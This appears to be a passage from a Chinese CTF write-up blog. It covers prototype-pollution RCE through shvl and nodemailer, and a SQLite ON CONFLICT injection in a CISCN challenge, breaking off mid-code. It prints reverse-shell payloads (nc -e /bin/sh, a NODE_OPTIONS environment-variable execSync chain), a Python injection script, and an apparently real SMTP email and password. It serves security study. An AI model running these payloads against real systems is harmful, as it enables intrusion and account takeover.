function_">json</span>(&#123; <span class="hljs-attr">message</span>: err.<span class="hljs-property">message</span> &#125;);<br>    &#125;<br>  &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>这里有一个细节就是引入了shvl库（当时第一次审代码的时候完全没有放在心上，只是觉得有点奇怪而已，以后要多留意这些被引入的库）。</p><p>其中在发信前调用了<code>shvl.set</code>方法，我们根据路径查找到<code>/node_modules/shvl/index&quot;</code>发现如下代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">set</span>  (object, path, val, obj) &#123;<br>  <span class="hljs-keyword">return</span> !<span class="hljs-regexp">/^(__proto__|constructor|prototype)$/</span>.<span class="hljs-title function_">test</span>(path) &amp;&amp; ((path = path.<span class="hljs-property">split</span> ? path.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>) : path.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>)).<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>).<span class="hljs-title function_">reduce</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">obj, p</span>) &#123;<br>    <span class="hljs-keyword">return</span> obj[p] = obj[p] || &#123;&#125;;<br>  &#125;, obj = object)[path.<span class="hljs-title function_">pop</span>()] = val), object;<br>&#125;;<br></code></pre></td></tr></table></figure><p>看样子有点像合并函数，但是ban了可以用来原型链污染的所有关键字，所以无法利用。</p><p>其实这里出了点问题，我看网上师傅们的wp上的源码都是只有过滤<code>__proto__</code>而我手上的源码全过滤了，但是在实际测试中发现使用<code>constructor.prototype</code>又能绕过，orz.</p><p>检查package.json里的shvl版本也是2.02，在github上也能看到到了2.03版本的修复中才加上了<code>constructor</code>和<code>prototype</code>。</p><p><img src="/../../img/8-bit%20pub-images/4.png"></p><p>这里就当做只过滤<code>__proto__</code>来进行审计吧</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">set</span>  (object, path, val, obj) &#123;<br>  <span class="hljs-keyword">return</span> !<span class="hljs-regexp">/^(__proto__)$/</span>.<span class="hljs-title function_">test</span>(path) &amp;&amp; ((path = path.<span class="hljs-property">split</span> ? path.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>) : path.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>)).<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>).<span class="hljs-title function_">reduce</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">obj, p</span>) &#123;<br>    <span class="hljs-keyword">return</span> obj[p] = obj[p] || &#123;&#125;;<br>  &#125;, obj = object)[path.<span class="hljs-title function_">pop</span>()] = val), object;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>这里又get了一个审计小技巧，对于这种在github上开源且有release更新的话可以直接去查看修改了哪些代码，直接定位历史漏洞。</strong></p><p>首先实现使用test进行正则判断，path的参数内是否含有<code>__proto__</code>，所以可以判断这里存在原型链污染漏洞且使用<code>constructor.prototype</code>绕过。（虽然不是很懂后半部分代码的具体含义。。。）</p><p>找到原型链污染的地方后就要寻找利用点了。</p><p>这里有两种寻找利用点的方法</p><p>第一种</p><p>在vscode全局搜索RCE利用点，例如<code>child_process</code>，可以在<code>node_modules\nodemailer\lib\sendmail-transport\index.js</code>里找到如下代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> spawn = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">spawn</span>;<br><span class="hljs-keyword">const</span> packageData = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../../package.json&#x27;</span>);<br><span class="hljs-keyword">const</span> shared = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../shared&#x27;</span>);<br>.....<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SendmailTransport</span> &#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options</span>) &#123;<br>        options = options || &#123;&#125;;<br><br>        <span class="hljs-comment">// use a reference to spawn for mocking purposes</span><br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">_spawn</span> = spawn;<br><br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span> = options || &#123;&#125;;<br>......<br></code></pre></td></tr></table></figure><p>继续跟进查看</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">try</span> &#123;<br>           sendmail = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_spawn</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">path</span>, args);<br>       &#125; <span class="hljs-keyword">catch</span> (E) &#123;<br>           <span class="hljs-variable language_">this</span>.<span class="hljs-property">logger</span>.<span class="hljs-title function_">error</span>(<br>               &#123;<br>                   <span class="hljs-attr">err</span>: E,<br>                   <span class="hljs-attr">tnx</span>: <span class="hljs-string">&#x27;spawn&#x27;</span>,<br>                   messageId<br>               &#125;,<br>               <span class="hljs-string">&#x27;Error occurred while spawning sendmail. %s&#x27;</span>,<br>               E.<span class="hljs-property">message</span><br>           );<br>           <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(E);<br>       &#125;<br></code></pre></td></tr></table></figure><p>跟进<code>this.path</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (options) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> options === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">path</span> = options;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> options === <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (options.<span class="hljs-property">path</span>) &#123;<br>                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">path</span> = options.<span class="hljs-property">path</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(options.<span class="hljs-property">args</span>)) &#123;<br>                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">args</span> = options.<span class="hljs-property">args</span>;<br>                &#125;<br>                <span class="hljs-variable language_">this</span>.<span class="hljs-property">winbreak</span> = [<span class="hljs-string">&#x27;win&#x27;</span>, <span class="hljs-string">&#x27;windows&#x27;</span>, <span class="hljs-string">&#x27;dos&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>].<span class="hljs-title function_">includes</span>((options.<span class="hljs-property">newline</span> || <span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">toLowerCase</span>());<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以在这里看到要给<code>this.path</code>赋值的条件是<code>options</code>的类型要是对象和<code>option</code>的<code>args</code>属性是数组。</p><p>接着要做的是检查如何触发</p><p>回到<code>mail.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> nodemailer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;nodemailer&quot;</span>);<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">contents</span>) &#123;<br>  <span class="hljs-keyword">let</span> transporter = nodemailer.<span class="hljs-title function_">createTransport</span>(&#123;<br>    <span class="hljs-attr">service</span>: <span class="hljs-string">&quot;qq&quot;</span>, <span class="hljs-comment">// Plz use your own smtp server for testing</span><br>    <span class="hljs-attr">port</span>: <span class="hljs-number">465</span>,<br>    <span class="hljs-attr">secureConnection</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">auth</span>: &#123;<br>      <span class="hljs-attr">user</span>: <span class="hljs-string">&quot;2449970596@qq.com&quot;</span>,<br>      <span class="hljs-attr">pass</span>: <span class="hljs-string">&quot;qlwwytxigkuzebdf&quot;</span>,<br>    &#125;,<br>  &#125;);<br>  <span class="hljs-keyword">return</span> transporter.<span class="hljs-title function_">sendMail</span>(contents);<br>&#125;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = send;<br></code></pre></td></tr></table></figure><p>这边可以继续跟进的地方是<code>createTransport</code>（没办法逐行debug真麻烦。。还要自己找）</p><p>在<code>node_modules\nodemailer\lib\nodemailer.js</code>中可以找到如下源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">createTransport</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">transporter, defaults</span>) &#123;<br>....<br><br>        <span class="hljs-keyword">if</span> (options.<span class="hljs-property">pool</span>) &#123;<br>            transporter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SMTPPool</span>(options);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (options.<span class="hljs-property">sendmail</span>) &#123;<br>            transporter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SendmailTransport</span>(options);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (options.<span class="hljs-property">streamTransport</span>) &#123;<br>            transporter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamTransport</span>(options);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (options.<span class="hljs-property">jsonTransport</span>) &#123;<br>....<br></code></pre></td></tr></table></figure><p>只要<code>options.sendmail</code>的值为真，就会实例化<code>SendmailTransport</code>类，也就是我们上面要进行原型链污染的类</p><p>至此可以尝试构造原型链污染如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;constructor.prototype.sendmail&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;constructor.prototype.path&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;sh&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;constructor.prototype.args&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;-c&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;nc ip port -e /bin/sh&quot;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>这个poc是用于反弹shell的，因为我的SMTP服务器配置有问题，所以只能这样做。</p><p><img src="/../../img/8-bit%20pub-images/6.png"></p><p><img src="/../../img/8-bit%20pub-images/5.png"></p><p>这边放一下其他师傅通过任意读文获得flag的方式</p><p>在nodemailer文档中发现使用attachments 可以进行任意文件读取</p><p>先把文件写到tmp目录下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<br>    <span class="hljs-string">&quot;constructor.prototype.sendmail&quot;</span>:<span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&quot;constructor.prototype.path&quot;</span>:<span class="hljs-string">&quot;sh&quot;</span>,<br>    <span class="hljs-string">&quot;constructor.prototype.args&quot;</span>:[<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span class="hljs-string">&quot;/readflag &gt; /tmp/flag.txt&quot;</span><br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><p>再利用attachments带出</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<br>    <span class="hljs-string">&quot;to&quot;</span>:<span class="hljs-string">&quot;i@example.com&quot;</span>,<br>    <span class="hljs-string">&quot;subject&quot;</span>:<span class="hljs-string">&quot;flag&quot;</span>,<br>    <span class="hljs-string">&quot;constructor.prototype.attachments&quot;</span>:[<br>        &#123;<br>            <span class="hljs-string">&quot;filename&quot;</span>:<span class="hljs-string">&quot;flag.txt&quot;</span>,<br>            <span class="hljs-string">&quot;path&quot;</span>:<span class="hljs-string">&quot;/tmp/flag.txt&quot;</span><br>        &#125;<br>    ]<br>&#125;<br></code></pre></td></tr></table></figure><p>以下是之前构造错误的原型链，没有双引号，等号当冒号用，nc反弹shell格式出错。。用于提醒自己</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elm">&#123;<br>constructor.proto<span class="hljs-keyword">type</span>.path=bash<br>constructor.proto<span class="hljs-keyword">type</span>.args=[nc,ip,port]<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>还有一个方法是污染原型链，先放个其他师傅的博客，后面再研究</p><blockquote><p>这里就比较直接了，因为nodemailer是有require<code>child_process</code>库的，那么我们可以使用<a href="https://blog.p6.is/Abusing-Environment-Variables/">Abusing Environment Variables (p6.is)</a>方法，污染env和shell，先放payload</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;constructor.prototype.sendmail&quot;</span><span class="hljs-punctuation">:</span> True<span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;constructor.prototype.shell&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;node&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;constructor.prototype.env.NODE_DEBUG&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;require(&#x27;child_process&#x27;).execSync(&#x27;nc ip port -e /bin/bash&#x27;);process.exit();//&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;constructor.prototype.env.NODE_OPTIONS&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;-r /proc/self/environ&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>这里污染了环境变量之后，每次以node执行命令的时候，就会加载<code>NODE_OPTIONS</code>选项，从而执行<code>/proc/self/environ</code>中存在的js代码，那么就很简单了，当默认使用发邮件的时候，spawn会调用默认的shell，也就是&#x2F;bin&#x2F;sh</p></blockquote><p>参考资料：</p><p>47.103.121.189&#x2F;2023&#x2F;04&#x2F;20&#x2F;网鼎杯2023线下半决赛突破题errormsg复现&#x2F;</p><p><a href="https://blog.csdn.net/lllffg/article/details/114548517">https://blog.csdn.net/lllffg/article/details/114548517</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023_CISCN_Pollution</title>
    <link href="/2023/06/24/2023CISCN/2023_CISCN_Pollution/"/>
    <url>/2023/06/24/2023CISCN/2023_CISCN_Pollution/</url>
    
    <content type="html"><![CDATA[<h2 id="2023-CISCN-Pollution"><a href="#2023-CISCN-Pollution" class="headerlink" title="2023_CISCN_Pollution"></a>2023_CISCN_Pollution</h2><p>开局经典登录框，一顿瞎试。查看源码可以猜测是使用sql注入，后来主办方也是提醒了在注册处存在sql注入。</p><p>经过注册登录测试可以猜到第一步是需要获得admin的密码。</p><p>在<code>app.js</code>里可以看到下列sql语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">db.<span class="hljs-title function_">all</span>(<span class="hljs-string">&quot;SELECT * FROM users WHERE username=? AND password=?&quot;</span>,[username,password],<span class="hljs-keyword">function</span>(<span class="hljs-params">err,result</span>)<br><br>db.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;SELECT * FROM users WHERE username=?&quot;</span>, [username], <span class="hljs-keyword">function</span>(<span class="hljs-params">err, row</span>)<br><br><span class="hljs-keyword">let</span> query = <span class="hljs-string">`INSERT INTO users (username, password) VALUES (&#x27;<span class="hljs-subst">$&#123;username&#125;</span>&#x27;, &#x27;<span class="hljs-subst">$&#123;utils.md5(password)&#125;</span>&#x27;)`</span><br></code></pre></td></tr></table></figure><p>可以看到前两句都进行了预编译，所以无法进行注入，我们把重点放到第三句上。非常简单的单引号闭合，对于我来说难点就在这里使用的是SQLite进行注入，当时在比赛的时候还没接触过这类的sql注入。。。用sqlmap硬跑没跑出来。</p><p>完整sql查询代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> query = <span class="hljs-string">`INSERT INTO users (username, password) VALUES (&#x27;<span class="hljs-subst">$&#123;username&#125;</span>&#x27;, &#x27;<span class="hljs-subst">$&#123;utils.md5(password)&#125;</span>&#x27;)`</span>;<br>            db.<span class="hljs-title function_">run</span>(query,<span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>)&#123;<br>              <span class="hljs-keyword">if</span>(err)&#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err)<br>                <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Error!&#x27;);window.location.href=&#x27;/register&#x27;&lt;/script&gt;&quot;</span>);<br>              &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Register successed&#x27;);window.location.href=&#x27;/login&#x27;&lt;/script&gt;&quot;</span>);<br>              &#125;<br></code></pre></td></tr></table></figure><p>可以看到对于语句执行错误或者成功会统一输出<code>Error</code>或者<code>success</code>，所以这里没办法使用报错注入或者直接联合查询拖库等查看admin密码。</p><p>这里的突破点是直接使用UPDATE语句来更新admin的密码。</p><p>经过测试常规的UPDATE语句没办法直接更新用户的密码，这里使用sqllite里的另一句更新数据的语句</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-params">...</span>..<span class="hljs-keyword">on</span> CONFLICT <span class="hljs-keyword">DO</span><span class="hljs-params">...</span>..<br></code></pre></td></tr></table></figure><p>所以构造如下注入语句</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;, &#x27;</span>md5(<span class="hljs-number">123456</span>)<span class="hljs-string">&#x27;) on CONFLICT DO UPDATE password = &#x27;</span>md5(<span class="hljs-number">123456</span>)<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><p>据此可以使用python写出如下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">SQLinjection</span>(<span class="hljs-params">url</span>):<br>    url=<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/register&#x27;</span><br>    passwd=<span class="hljs-string">&#x27;123456&#x27;</span><br>    <span class="hljs-built_in">hash</span>=passwd.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>)<br>    data=&#123;<br>        <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">f&quot;admin&#x27;,&#x27;<span class="hljs-subst">&#123;md5.md5(<span class="hljs-built_in">hash</span>).hexdigest()&#125;</span>&#x27;) on CONFLICT DO UPDATE SET password=&#x27;<span class="hljs-subst">&#123;md5.md5(<span class="hljs-built_in">hash</span>).hexdigest()&#125;</span>&#x27; --+&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span><br>    &#125;<br>    res=s.post(url=url,data=data)<br>    <span class="hljs-keyword">if</span> res.status_code == <span class="hljs-number">200</span> :<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;injected successfully!\n&quot;</span>,res.content)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;injected failed&quot;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    url=<span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>    SQLinjection(url)<br></code></pre></td></tr></table></figure><p>注入成功后就进入<code>/admin</code>页面了，然而web页面什么都没有。开始审计源码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">all</span>(<span class="hljs-string">&quot;/admin&quot;</span>,utils.<span class="hljs-property">checkIsAdmin</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">req,res,next</span>)&#123;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">method</span> == <span class="hljs-string">&quot;GET&quot;</span>)&#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;home&#x27;</span>,&#123;<span class="hljs-string">&#x27;username&#x27;</span>:req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>&#125;)<br>  &#125;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">method</span> == <span class="hljs-string">&quot;POST&quot;</span>)&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">Info</span> =&#123;<br>      <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<br>      <span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;Try2HackMe!&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">try</span>&#123;<br>      utils.<span class="hljs-title function_">extend</span>(<span class="hljs-title class_">Info</span>, req.<span class="hljs-property">body</span>);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, &#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-title class_">Info</span>.<span class="hljs-property">username</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-title class_">Info</span>.<span class="hljs-property">message</span>&#125;);<br>    &#125;<span class="hljs-keyword">catch</span>(err)&#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Error!&#x27;);window.location.href=&#x27;/admin&#x27;&lt;/script&gt;&quot;</span>);<br>    &#125;<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>定位到<code>utils.extend</code>在<code>utils.js</code>中查看源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">static</span> <span class="hljs-title function_">extend</span>(<span class="hljs-params">target</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">length</span>; i++) &#123;<br>            <span class="hljs-keyword">var</span> source = <span class="hljs-variable language_">arguments</span>[i]<br>            <br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> key <span class="hljs-keyword">in</span> source) &#123;<br>                <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;__proto__&#x27;</span>) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (hasOwnProperty.<span class="hljs-title function_">call</span>(source, key)) &#123;<br>                    <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>                        <span class="hljs-title class_">Utils</span>.<span class="hljs-title function_">extend</span>(target[key], source[key])<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        target[key] = source[key]<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> target<br>    &#125;<br></code></pre></td></tr></table></figure><p>很典型的递归调用合并函数。至此可以判断下一步的利用点是原型链污染。</p><p>同时可以看到在<code>__proto__</code>属性被过滤了，这里使用<code>constructor.prototype</code>进行绕过。</p><p>现在把重点放在<code>entxend</code>函数后面的<code>render</code>函数里面。设置debug进行逐行审计。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">utils</span>.js-&gt;</span>render()<br><span class="hljs-function"><span class="hljs-title">response</span>.js-&gt;</span>app.render()<br><span class="hljs-function"><span class="hljs-title">application</span>-&gt;</span>view.render()<br><span class="hljs-function"><span class="hljs-title">twig</span>.js-&gt;</span>Twig.exports.twig()<br><span class="hljs-function"><span class="hljs-title">twig</span>.js-&gt;</span>Twig.Templates.loadRemote()<br><span class="hljs-function"><span class="hljs-title">twig</span>.js-&gt;</span>Twig.Templates.loadRemote()<br></code></pre></td></tr></table></figure><p>首先是进入response.js里的res.render()函数,这里的操作就是对一些数据进行了赋值。</p><p>接着进入到了application.js里的app.render()里，也是对一些数据进行了赋值。</p><p>接着进入到了application.js里的this.set(path)</p><p>在view.js里设置了fileName值为变量name的值，即<code>admin</code></p><p>接着在这里</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td 